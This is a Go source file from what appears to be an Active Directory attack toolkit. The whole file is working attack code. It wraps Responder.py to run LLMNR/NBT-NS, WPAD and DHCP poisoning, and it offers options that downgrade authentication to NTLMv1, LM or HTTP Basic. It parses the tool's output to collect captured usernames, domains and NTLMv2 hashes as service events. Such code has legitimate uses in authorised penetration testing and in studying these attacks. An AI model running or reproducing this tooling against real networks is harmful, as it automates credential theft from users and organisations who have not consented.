package runtime

import (
	"bufio"
	"context"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"adpack/core"
)

// responderCaptureRe parses Responder stdout lines for usernames and hashes.
// Pattern matches:
//
//	"[SMB] NTLMv2-SSP Username : DOMAIN\user"
//	"[SMB] NTLMv2-SSP Hash     : user::DOMAIN:..."
type responderCaptureRe struct {
	username *regexp.Regexp
	hash     *regexp.Regexp
}

var responderRe = responderCaptureRe{
	username: regexp.MustCompile(`\[(\w+)\]\s+NTLMv2-SSP\s+Username\s*:\s*([A-Za-z0-9._-]+)\\([A-Za-z0-9._-]+)`),
	hash:     regexp.MustCompile(`\[(\w+)\]\s+NTLMv2-SSP\s+Hash\s*:\s*([A-Za-z0-9._-]+)`),
}

// ResponderConfig carries parameters for a Responder poisoning listener.
type ResponderConfig struct {
	Interface     string // network interface (e.g. eth0)
	Analyze       bool   // passive/analyze mode (no poisoning)
	WPAD          bool   // start WPAD rogue proxy server
	ProxyAuth     bool   // force NTLM/Basic proxy auth
	Basic         bool   // downgrade to HTTP Basic auth
	LM            bool   // force LM hashing downgrade
	DisableESS    bool   // NTLMv1 downgrade
	DHCP          bool   // DHCPv4 poisoning
	ForceWpadAuth bool   // force auth on wpad.dat retrieval
	ExternalIP    string // spoofed IP for poisoned answers
	Verbose       bool   // increased output
	Path          string // Responder.py path (empty = auto-discover)
}

// DefaultResponderConfig returns a minimal sensible configuration.
func DefaultResponderConfig(iface string) ResponderConfig {
	return ResponderConfig{
		Interface: iface,
		Verbose:   true,
	}
}

// startResponder spawns a Responder.py process with the given config.
func startResponder(ctx context.Context, cfg ResponderConfig) (*exec.Cmd, <-chan string, func() error, error) {
	args := buildResponderArgs(cfg)

	responderPath := cfg.Path
	if responderPath == "" {
		if p, err := exec.LookPath("responder"); err == nil {
			responderPath = p
		} else {
			responderPath = "/usr/share/responder/Responder.py"
		}
	}

	cmd := exec.CommandContext(ctx, "python3", append([]string{responderPath}, args...)...)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, nil, nil, err
	}

	if err := cmd.Start(); err != nil {
		return nil, nil, nil, err
	}

	captures := make(chan string, 64)

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(captures)
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			line := scanner.Text()
			captures <- line
		}
	}()

	stop := func() error {
		if cmd.Process != nil {
			return cmd.Process.Kill()
		}
		return nil
	}

	go func() {
		cmd.Wait()
		wg.Wait()
	}()

	return cmd, captures, stop, nil
}

// buildResponderArgs converts config to Responder.py CLI args.
func buildResponderArgs(cfg ResponderConfig) []string {
	var args []string

	if cfg.Interface != "" {
		args = append(args, "-I", cfg.Interface)
	}
	if cfg.Analyze {
		args = append(args, "-A")
	}
	if cfg.WPAD {
		args = append(args, "-w")
	}
	if cfg.ProxyAuth {
		args = append(args, "-P")
	}
	if cfg.Basic {
		args = append(args, "-b")
	}
	if cfg.LM {
		args = append(args, "--lm")
	}
	if cfg.DisableESS {
		args = append(args, "--disable-ess")
	}
	if cfg.DHCP {
		args = append(args, "-d")
	}
	if cfg.ForceWpadAuth {
		args = append(args, "-F")
	}
	if cfg.ExternalIP != "" {
		args = append(args, "-e", cfg.ExternalIP)
	}
	if cfg.Verbose {
		args = append(args, "-v")
	}

	return args
}

// parseResponderLine extracts (username, domain, protocol) from a Responder capture line.
// Returns empty strings if no match.
func parseResponderLine(line string) (username, domain, protocol string) {
	if m := responderRe.username.FindStringSubmatch(line); len(m) >= 4 {
		return m[3], m[2], m[1]
	}
	return "", "", ""
}

// NewResponderService creates a configured ManagedService backed by Responder.py.
func NewResponderService(id, label string, cfg ResponderConfig) *core.ManagedService {
	return &core.ManagedService{
		ID:    id,
		Type:  core.ServiceResponder,
		Label: label,
		State: core.ServiceStopped,
		Config: map[string]any{
			"interface":  cfg.Interface,
			"analyze":    cfg.Analyze,
			"wpad":       cfg.WPAD,
			"proxy_auth": cfg.ProxyAuth,
		},
		ValidUntil: time.Now().Add(4 * time.Hour),
		Events:     make(chan core.ServiceEvent, 64),
	}
}

// StartResponderService starts a registered Responder service.
func StartResponderService(svc *core.ManagedService, cfg ResponderConfig, parentCtx context.Context) error {
	ctx, cancel := context.WithCancel(parentCtx)

	cmd, lines, stop, err := startResponder(ctx, cfg)
	if err != nil {
		cancel()
		return err
	}

	svc.Config["_cmd"] = cmd
	svc.Config["_cancel"] = cancel
	svc.StopFn = func() error {
		cancel()
		return stop()
	}
	svc.State = core.ServiceRunning
	svc.LastHeartbeat = time.Now()

	// Track the last seen username to pair with the following hash line
	var pendingUser, pendingDomain, pendingProtocol string

	go func() {
		for line := range lines {
			if user, domain, proto := parseResponderLine(line); user != "" {
				pendingUser = user
				pendingDomain = domain
				pendingProtocol = proto
				continue
			}

			if pendingUser != "" && responderRe.hash.MatchString(line) {
				svc.Events <- core.ServiceEvent{
					Type:      core.EvHashCaptured,
					ServiceID: svc.ID,
					Service:   core.ServiceResponder,
					Timestamp: time.Now(),
					Data: map[string]any{
						"raw":            line,
						"source_user":    pendingUser,
						"source_domain":  strings.ToUpper(pendingDomain),
						"protocol":       pendingProtocol,
						"capture_method": "responder",
					},
				}
				pendingUser = ""
				pendingDomain = ""
				pendingProtocol = ""
				continue
			}

			// Poison notifications — emit as session capture hints
			if strings.Contains(line, "Poisoned answer sent") {
				svc.Events <- core.ServiceEvent{
					Type:      core.EvSessionCaptured,
					ServiceID: svc.ID,
					Service:   core.ServiceResponder,
					Timestamp: time.Now(),
					Data: map[string]any{
						"raw":            line,
						"capture_method": "poison",
					},
				}
			}
		}
		svc.State = core.ServiceStopped
	}()

	return nil
}
